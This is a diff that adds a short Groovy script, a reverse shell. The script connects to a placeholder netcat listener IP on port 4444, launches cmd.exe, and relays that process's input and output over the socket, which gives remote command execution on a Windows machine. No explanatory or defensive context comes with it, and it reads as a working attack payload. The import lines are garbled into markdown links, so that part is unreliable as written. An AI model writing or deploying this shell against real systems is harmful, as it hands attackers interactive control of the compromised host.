@@ -1,0 +1,26 @@
+import [java.net](http://java.net/).*
+import [java.io](http://java.io/).*
+
+def host = "<netcat listerner ip>"
+def port = 4444
+
+def socket = new Socket(host, port)
+
+def process = new ProcessBuilder("cmd.exe")
+.redirectErrorStream(true)
+.start()
+
+def pi = process.getInputStream()
+def si = socket.getInputStream()
+def po = process.getOutputStream()
+def so = socket.getOutputStream()
+
+while (!socket.isClosed()) {
+while (pi.available() > 0)
+so.write(pi.read())
+while (si.available() > 0)
+po.write(si.read())
+so.flush()
+po.flush()
+Thread.sleep(50)
+}
